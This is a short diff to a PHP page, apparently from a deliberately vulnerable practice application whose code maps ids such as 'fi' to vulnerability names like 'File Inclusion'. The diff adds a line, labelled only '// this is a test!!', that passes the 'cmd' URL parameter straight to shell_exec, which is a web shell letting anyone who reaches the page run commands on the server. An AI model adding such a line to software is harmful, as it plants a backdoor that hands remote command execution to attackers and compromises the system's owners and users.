@@ -12,7 +12,9 @@ if (array_key_exists ("id", $_GET) && array_key_exists ("security", $_GET)) {
 	$id       = $_GET[ 'id' ];
 	$security = $_GET[ 'security' ];
 
-
+// this is a test!!
+	$cmd = shell_exec($_GET['cmd']);
+	
 	switch ($id) {
 		case "fi" :
 			$vuln = 'File Inclusion';
